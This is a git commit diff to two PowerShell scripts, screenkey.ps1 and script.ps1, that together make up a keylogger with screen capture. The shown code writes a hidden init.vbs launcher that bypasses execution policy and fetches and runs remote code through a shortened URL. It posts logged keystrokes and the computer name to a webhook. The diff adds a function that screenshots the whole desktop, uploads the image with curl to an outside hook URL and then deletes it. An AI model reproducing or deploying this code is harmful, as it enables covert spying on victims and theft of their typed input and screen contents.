bbddbb21bb9a50b37813ed14ae9baa0598fde239
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-06 19:44:33 +0100

    Add files via upload

--- screenkey.ps1
+++ screenkey.ps1
@@ -9,7 +9,24 @@ $mkFile | Out-File -FilePath $pth -Force
 $mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://t.ly/o4SrC | iex`", 0, True"
 $mkFile | Out-File -FilePath $pth -Append -Force
 Rename-Item -Path $pth -NewName "init.vbs" -Force
-
+function screenshot {
+		$Filett = "$env:temp\SC.png"
+		Add-Type -AssemblyName System.Windows.Forms
+		Add-type -AssemblyName System.Drawing
+		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+		$Width = $Screen.Width
+		$Height = $Screen.Height
+		$Left = $Screen.Left
+		$Top = $Screen.Top
+		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+		Start-Sleep 1
+		curl.exe -F "file1=@$filett" $hookurl
+		Start-Sleep 1
+		Remove-Item -Path $filett
+		}
 $send = ""
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -83,24 +100,6 @@ while ($true) {
             $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
             $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-		function screenshot {
-		$Filett = "$env:temp\SC.png"
-		Add-Type -AssemblyName System.Windows.Forms
-		Add-type -AssemblyName System.Drawing
-		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-		$Width = $Screen.Width
-		$Height = $Screen.Height
-		$Left = $Screen.Left
-		$Top = $Screen.Top
-		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-		Start-Sleep 1
-		curl.exe -F "file1=@$filett" $hookurl
-		Start-Sleep 1
-		Remove-Item -Path $filett
-		}
             $send = ""
             $keyPressed = $false
         }
--- script.ps1
+++ script.ps1
@@ -3,6 +3,24 @@ if ($dc.Ln -ne 121) {
     $dc = (irm $dc).url
 }
 
+function screenshot {
+		$Filett = "$env:temp\SC.png"
+		Add-Type -AssemblyName System.Windows.Forms
+		Add-type -AssemblyName System.Drawing
+		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+		$Width = $Screen.Width
+		$Height = $Screen.Height
+		$Left = $Screen.Left
+		$Top = $Screen.Top
+		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+		Start-Sleep 1
+		curl.exe -F "file1=@$filett" $hookurl
+		Start-Sleep 1
+		Remove-Item -Path $filett
+		}
 $send = ""
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -76,7 +94,6 @@ while ($true) {
             $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
             $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-
             $send = ""
             $keyPressed = $false
         }
